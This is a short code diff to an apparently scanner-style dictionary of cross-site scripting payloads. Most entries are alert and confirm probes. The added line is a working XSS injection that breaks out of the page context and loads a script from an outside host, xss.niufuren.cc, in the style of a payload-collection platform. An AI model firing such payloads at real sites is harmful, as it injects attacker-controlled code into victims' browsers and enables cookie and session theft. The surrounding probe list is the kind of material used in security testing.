@@ -48,6 +48,7 @@ XSS_Rule = {
         "\" onfous=alert(document.domain)\"><\"",
         "\"`'></textarea><audio/onloadstart=confirm`1` src>",
         "\"</script><svg onload=alert`1`>",
+        "</textarea>'\";})><script src=http://xss.niufuren.cc/QHDPCg?1526370987></script>"
         # "\"`'></textarea><audio/onloadstart=confirm`1` src>",
     ],
     "lfi": [
